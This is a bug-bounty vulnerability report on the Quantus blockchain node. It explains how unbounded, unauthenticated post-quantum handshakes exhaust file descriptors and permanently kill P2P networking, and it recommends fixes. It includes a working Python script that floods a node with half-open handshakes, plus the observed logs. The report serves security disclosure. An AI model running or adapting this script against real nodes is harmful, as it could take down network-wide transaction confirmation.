# 89036 bc high unbounded unauthenticated pq handshakes permanently terminate node p2p networking and can halt network wide transaction confirmation

**Submitted on Aug 16th 2026 at 17:20:14 UTC by @Pig46940 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89036
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

Quantus applies its incoming-connection limit only after a P2P connection has completed the full handshake. An unauthenticated client can therefore create an arbitrary number of pending connections on the publicly exposed P2P port. After negotiating `/noise`, each connection also makes the node generate a fresh ML-KEM-768 keypair and sign it with ML-DSA before the client sends its first PQ handshake message. Pending connections consume CPU and one file descriptor each. When the finite descriptor limit is reached, a single `EMFILE` error is treated as permanent transport termination: the complete litep2p backend, including block announcements, synchronization, transaction propagation, discovery, and all existing peer connections, shuts down and does not restart. The attack is independently repeatable against publicly reachable block-producing nodes; simultaneous targeting can leave the network without a connected block producer capable of establishing transaction confirmations.

## Vulnerability Details

### 1. Pending connections are not included in connection accounting

`ConnectionLimits` stores only established incoming and outgoing connection IDs:

* `client/litep2p/src/transport/manager/limits.rs`

```rust
pub struct ConnectionLimits {
	/// Configuration for the connection limits.
	config: ConnectionLimitsConfig,

	/// Established incoming connections.
	incoming_connections: HashSet<ConnectionId>,
	/// Established outgoing connections.
	outgoing_connections: HashSet<ConnectionId>,
}
```

The admission check compares the configured maximum exclusively with `incoming_connections.len()`:

* `client/litep2p/src/transport/manager/limits.rs`

```rust
	pub fn on_incoming(&mut self) -> Result<(), ConnectionLimitsError> {
		if let Some(max_incoming_connections) = self.config.max_incoming_connections {
			if self.incoming_connections.len() >= max_incoming_connections {
				return Err(ConnectionLimitsError::MaxIncomingConnectionsExceeded);
			}
		}

		Ok(())
	}
```

The transport manager calls this non-reserving check when it receives a pending connection:

* `client/litep2p/src/transport/manager/mod.rs`

```rust
						TransportEvent::PendingInboundConnection { connection_id } => {
							if self.on_pending_incoming_connection().is_ok() {
								tracing::trace!(
									target: LOG_TARGET,
									?connection_id,
									"accept pending incoming connection",
								);

								let _ = self
									.transports
									.get_mut(&transport)
									.expect("transport to exist")
									.accept_pending(connection_id);
```

The connection ID is inserted into the accounting set only after the handshake succeeds and the connection is accepted as established:

* `client/litep2p/src/transport/manager/mod.rs`

```rust
		if connection_accepted {
			self.connection_limits
				.accept_established_connection(endpoint.connection_id(), endpoint.is_listener());
```

Consequently, if a node has 20 established connections, 1, 1,000, or 100,000 simultaneous pending handshakes all observe the same established count of 20 and pass the admission check. The configured `MAX_CONNECTIONS_ESTABLISHED_INCOMING` value of 10,000 does not bound pending connections.

Each accepted socket is placed into the pending connection future set and remains live until negotiation succeeds, fails, or times out:

* `client/litep2p/src/transport/manager/mod.rs`

```rust
		self.pending_connections.push(Box::pin(async move {
			TcpConnection::accept_connection(
				connection,
				connection_id,
				keypair,
				address,
				yamux_config,
				max_read_ahead_factor,
				max_write_buffer_size,
				connection_open_timeout,
				substream_open_timeout,
			)
			.await
			.map_err(|error| (connection_id, error.into()))
		}));
```

There is no global pending-handshake limit, per-IP limit, or reservation counter.

### 2. Quantus performs ML-KEM and ML-DSA work before authenticating the client

After the unauthenticated client completes the small multistream negotiation for `/noise`, the node enters the Quantus pqXX handshake:

* `client/litep2p/src/transport/tcp/connection.rs`

```rust
		let (stream, _) =
			Self::negotiate_protocol(stream, &role, vec!["/noise"], substream_open_timeout).await?;

		tracing::trace!(
			target: LOG_TARGET,
			"`multistream-select` and `noise` negotiated",
		);

		// perform noise handshake
		let (stream, peer) = noise::handshake(
			stream.inner(),
			&keypair,
			role,
			max_read_ahead_factor,
			max_write_buffer_size,
			substream_open_timeout,
			noise::HandshakeTransport::Tcp,
		)
		.await?;
```

At the beginning of `noise::handshake`, the listener constructs a new `NoiseContext`:

* `client/litep2p/src/crypto/noise/mod.rs`

```rust
let mut noise = NoiseContext::new(keypair, role)?;
```

`NoiseContext::new` generates a fresh ML-KEM-768 keypair and then signs its public key using the node's ML-DSA identity:

* `client/litep2p/src/crypto/noise/mod.rs`

```rust
	pub fn new(keypair: &Keypair, role: Role) -> Result<Self, NegotiationError> {
		tracing::trace!(target: LOG_TARGET, ?role, "create new noise configuration (pqXX + ML-KEM 768)");

		// Generate ML-KEM 768 keypair for Noise static key
		let kem_keypair = protocol::Keypair::new();

		let is_initiator = matches!(role, Role::Dialer);
		let session = ClatterSession::new(&[], is_initiator, &kem_keypair)?;

		Self::assemble(session, kem_keypair, keypair, role)
	}
```

* `client/litep2p/src/crypto/noise/mod.rs`

```rust
		let signature = id_keys
			.sign(&[STATIC_KEY_DOMAIN.as_bytes(), kem_keypair.public().as_ref()].concat())
			.map_err(|e| NegotiationError::SigningFailed(e.to_string()))?;
```

Only after generating and signing this material does the listener wait for the unauthenticated client's first pqXX message:

* `client/litep2p/src/crypto/noise/mod.rs`

```rust
                Role::Listener => {
				// pqXX Message 1: <- e (remote's ephemeral KEM public key)
				tracing::debug!(target: LOG_TARGET, "pqXX listener: waiting for message 1");
				let _ = noise.read_handshake_message(&mut io).await?;
                                // ...
                }
```

The attacker therefore needs to send only two small multistream frames and does not need a valid PeerId, ML-DSA key, or completed Noise handshake to trigger the node's PQ work. This creates a computational amplification path in addition to linear socket/file-descriptor consumption.

### 3. One resource-exhaustion error permanently terminates all P2P transports

When the process reaches its file-descriptor limit, `accept()` returns `EMFILE` (`Too many open files`). `TcpTransport::poll_next` treats any listener error as permanent stream termination:

* `client/litep2p/src/transport/tcp/mod.rs`

```rust
				Some(Err(error)) => {
					tracing::error!(
						target: LOG_TARGET,
						?error,
						"TCP listener terminated with error",
					);

					Poll::Ready(None)
				},
```

The transport manager interprets that `None` as termination of the installed transports and exits:

* `client/litep2p/src/transport/manager/mod.rs`

```rust
				event = self.transports.next() => {
					let Some((transport, event)) = event else {
						tracing::error!(
							target: LOG_TARGET,
							"Installed transports terminated, ignore if the node is stopping"
						);

						return None;
					};
```

There is no retry, listener recreation, backoff, or recovery after descriptors become available again. The process can remain alive while its P2P port is closed and every networking protocol has terminated.

### 4. The vulnerable listener is intentionally public

This attack does not use the trusted miner-to-node channel. Quantus documentation explicitly states that P2P port `30333` is intended to be publicly reachable, while the miner and RPC ports should remain private. No privileged access, leaked credential, miner authentication, local-network position, or valid P2P identity is required.

The issue is also specific to Quantus's integration: Quantus uses its modified post-quantum litep2p implementation as the network backend and performs ML-KEM-768 generation plus ML-DSA signing in the unbounded pre-authentication path.

## Impact Details

### Directly reproduced impact

The following effects were reproduced against a local Quantus node:

* Hundreds of unauthenticated `/noise` handshakes were admitted concurrently without reaching the configured established-connection ceiling.
* When the finite descriptor limit was reached in a safely constrained local run, the node logged `Too many open files` and terminated the entire litep2p backend.
* Synchronization, state requests, transaction propagation, block announcements, Kademlia, identify, ping, and light-client protocols all closed.
* After the attacking sockets were released, new connections to the P2P port received `ConnectionRefusedError`; the listener did not recover.
* The node process remained alive. With `--force-authoring`, it continued mining an isolated chain that could not be propagated to peers.

### Critical network-wide consequence

The exploit is stateless and independently repeatable against every reachable Quantus P2P listener. Node addresses are distributed through ordinary P2P discovery and connection establishment. An attacker can maintain the same pending-handshake load against the reachable block-producing nodes in parallel.

Once the targeted backends terminate:

{% stepper %}
{% step %}

## Existing P2P connections are closed.

{% endstep %}

{% step %}

## Transactions cannot propagate between nodes.

{% endstep %}

{% step %}

## Blocks and block announcements cannot propagate.

{% endstep %}

{% step %}

## Nodes cannot synchronize or discover replacements.

{% endstep %}

{% step %}

## Restarted nodes can be attacked again before they rejoin.

{% endstep %}
{% endstepper %}

If block producers follow the normal offline behavior, disconnected miners cannot collectively extend and propagate a canonical chain. If operators enable force authoring, isolated miners can produce local competing branches, but no branch can obtain network-wide confirmation while the partition is maintained. In either case, simultaneously targeting the effective block-producing set leaves the network unable to confirm new transactions.

This maps to the listed Critical impact:

> Network not being able to confirm new transactions (total network shutdown)

The report does **not** claim an unintended permanent chain split requiring a hard fork. Restarting protected nodes and applying normal fork choice should recover from isolated branches; the directly demonstrated persistence is termination of the P2P service until process restart.

### Recommended Remediation

{% stepper %}
{% step %}

## Reserve a pending-connection slot atomically before accepting a socket into protocol negotiation.

{% endstep %}

{% step %}

## Apply a small global pending-handshake maximum independent of the 10,000 established-connection ceiling.

Size it conservatively enough that it also bounds concurrent ML-KEM/ML-DSA work.
{% endstep %}

{% step %}

## Add per-IP/subnet admission and rate limits.

{% endstep %}

{% step %}

## Release reservations on success, rejection, timeout, and every error path.

{% endstep %}

{% step %}

## Treat transient accept errors such as `EMFILE`, `ENFILE`, and temporary resource exhaustion as recoverable.

Back off and retry rather than returning `Poll::Ready(None)`.
{% endstep %}
{% endstepper %}

## References

* [`ConnectionLimits` counts established connections only](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/manager/limits.rs#L59-L156)
* [Pending connection admission does not reserve capacity](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/manager/mod.rs#L731-L734)
* [The connection is counted only after establishment](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/manager/mod.rs#L814-L845)
* [Pending connection is placed in the unbounded future set](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/tcp/mod.rs#L131-L167)
* [TCP negotiation and Quantus Noise handshake](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/tcp/connection.rs#L413-L453)
* [ML-KEM generation and ML-DSA signature before the first listener read](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/crypto/noise/mod.rs#L119-L155)
* [Listener waits for message 1 only after `NoiseContext::new`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/crypto/noise/mod.rs#L760-L841)
* [Listener error permanently terminates `TcpTransport`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/tcp/mod.rs#L578-L600)
* [Transport termination exits the transport manager](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/litep2p/src/transport/manager/mod.rs#L1110-L1118)
* [Quantus configures a limit of 10,000 established, not pending, inbound connections](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/network/src/litep2p/mod.rs#L515-L525)
* [P2P port 30333 is intended to be public](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/MINING.md#L334-L340)

## Proof of Concept

{% stepper %}
{% step %}

## Build the node

```bash
cargo build --profile production -p quantus-node
```

{% endstep %}

{% step %}

## Create the local-only handshake PoC

Save the following as `poc_pending_pq_handshakes.py`:

```python
#!/usr/bin/env python3
import argparse
import asyncio
import ipaddress
import resource
import sys
import time

HEADER = b"/multistream/1.0.0\n"
NOISE = b"/noise\n"

def frame(payload):
    assert len(payload) < 128
    return bytes([len(payload)]) + payload

async def read_frame(reader, timeout):
    length = (await asyncio.wait_for(reader.readexactly(1), timeout))[0]
    return await asyncio.wait_for(reader.readexactly(length), timeout)

async def open_pending(host, port, timeout):
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(host, port), timeout
    )

    writer.write(frame(HEADER))
    await writer.drain()
    assert await read_frame(reader, timeout) == HEADER

    writer.write(frame(NOISE))
    await writer.drain()
    assert await read_frame(reader, timeout) == NOISE

    # Do not send pqXX message 1. The node has already generated its ML-KEM
    # keypair and ML-DSA signature and now waits for this unauthenticated client.
    return reader, writer

async def main(args):
    if not ipaddress.ip_address(args.host).is_loopback:
        print("refusing non-loopback target", file=sys.stderr)
        return 2
    if args.connections > 1000:
        print("bounded PoC limit is 1000", file=sys.stderr)
        return 2

    soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
    if soft != resource.RLIM_INFINITY and args.connections + 64 >= soft:
        print(f"client RLIMIT_NOFILE is only {soft}", file=sys.stderr)
        return 2

    semaphore = asyncio.Semaphore(args.parallel)

    async def one(index):
        async with semaphore:
            try:
                return await open_pending(args.host, args.port, args.timeout)
            except Exception as error:
                return index, error

    started = time.monotonic()
    results = await asyncio.gather(*(one(i) for i in range(args.connections)))

    sockets = []
    failures = []
    for result in results:
        if isinstance(result[0], int):
            failures.append(result)
        else:
            sockets.append(result)

    print(
        f"negotiated={len(sockets)} failed={len(failures)} "
        f"elapsed={time.monotonic() - started:.2f}s hold={args.hold:.2f}s"
    )
    for index, error in failures[:5]:
        print(f"failure[{index}]: {type(error).__name__}: {error}")

    await asyncio.sleep(args.hold)

    for _, writer in sockets:
        writer.close()
    await asyncio.gather(
        *(writer.wait_closed() for _, writer in sockets),
        return_exceptions=True,
    )

    if len(sockets) != args.connections:
        print("not all requested pending handshakes were admitted", file=sys.stderr)
        return 1

    print("all requested unauthenticated /noise handshakes were admitted")
    return 0

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="127.0.0.1")
parser.add_argument("--port", type=int, default=30333)
parser.add_argument("--connections", type=int, default=128)
parser.add_argument("--parallel", type=int, default=32)
parser.add_argument("--hold", type=float, default=3.0)
parser.add_argument("--timeout", type=float, default=5.0)
args = parser.parse_args()
raise SystemExit(asyncio.run(main(args)))
```

The script refuses non-loopback destinations and limits itself to 1,000 connections.
{% endstep %}

{% step %}

## Reproduce descriptor exhaustion and permanent P2P termination

To avoid exhausting the workstation's normal descriptor table, run a separate local node with a deliberately constrained process limit. This does not create the vulnerability; it safely reaches the same finite-resource boundary with fewer local sockets and reproduces the complete failure path.

```bash
prlimit --nofile=512:512 -- \
./target/production/quantus-node \
  --dev \
  --tmp \
  --port 30334 \
  --rpc-port 9945 \
  --force-authoring
```

Run:

```bash
python3 ./poc_pending_pq_handshakes.py \
  --port 30334 \
  --connections 600 \
  --parallel 128 \
  --hold 3
```

Observed client result:

```
negotiated=363 failed=237 elapsed=0.72s hold=3.00s
failure[268]: ConnectionResetError: [Errno 104] Connection reset by peer
failure[295]: IncompleteReadError: 0 bytes read on a total of 1 expected bytes
not all requested pending handshakes were admitted
```

At the same time, the node logged:

```
TCP listener terminated with error error=Os {
    code: 24,
    message: "Too many open files"
}
Installed transports terminated, ignore if the node is stopping
Litep2p backend terminated
transport service closed protocol=".../sync/2"
transport service closed protocol=".../state/2"
transport service closed protocol=".../transactions/1"
transport service closed protocol=".../block-announces/1"
transport service stream ended, terminating identify event loop
Terminating `SyncingEngine` because `NotificationService` has terminated.
```

This is not merely rejection of excess clients: all installed networking transports and consensus-related protocol services terminate.
{% endstep %}

{% step %}

## Confirm that releasing resources does not restore P2P service

After the first script has closed its sockets, run a single connection attempt:

```bash
python3 ./poc_pending_pq_handshakes.py \
  --port 30334 \
  --connections 1
```

Observed result:

```
negotiated=0 failed=1 elapsed=0.00s hold=3.00s
failure[0]: ConnectionRefusedError: [Errno 111] Connect call failed ('127.0.0.1', 30334)
not all requested pending handshakes were admitted
```

The process was still running and its RPC server remained available, but its public P2P listener never recovered. A process restart was required. Because the request contains no node-specific state, credential, or fixed PeerId, the same PoC can be independently directed at each reachable block producer. Each affected node closes synchronization, transaction propagation, and block-announcement protocols, producing the network-wide consequence described in the Impact section.
{% endstep %}
{% endstepper %}
